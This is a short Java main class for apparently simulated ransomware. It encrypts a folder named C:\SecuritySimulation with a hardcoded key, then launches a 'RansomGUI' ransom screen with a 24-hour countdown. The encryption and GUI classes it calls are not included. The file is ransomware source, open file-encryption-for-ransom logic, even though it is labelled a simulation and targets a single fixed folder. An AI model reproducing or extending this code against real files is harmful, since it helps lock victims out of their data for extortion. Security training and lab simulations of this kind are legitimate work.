import javax.swing.*;
import java.io.File;
import java.util.concurrent.TimeUnit;

public class Main {
    private static final String ENCRYPTION_KEY = "NoOneWasHere";
    private static final String FOLDER_PATH = "C:\\SecuritySimulation";
    private static final long COUNTDOWN_DURATION_MS = TimeUnit.HOURS.toMillis(24); // 24 hours

    public static void main(String[] args) {
        try {
            File folder = new File(FOLDER_PATH);
            FileEncryptor.encryptFolderWithPassword(folder, ENCRYPTION_KEY);
            SwingUtilities.invokeLater(() -> {
                RansomGUI gui = new RansomGUI(folder, ENCRYPTION_KEY, COUNTDOWN_DURATION_MS);
                gui.show();
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
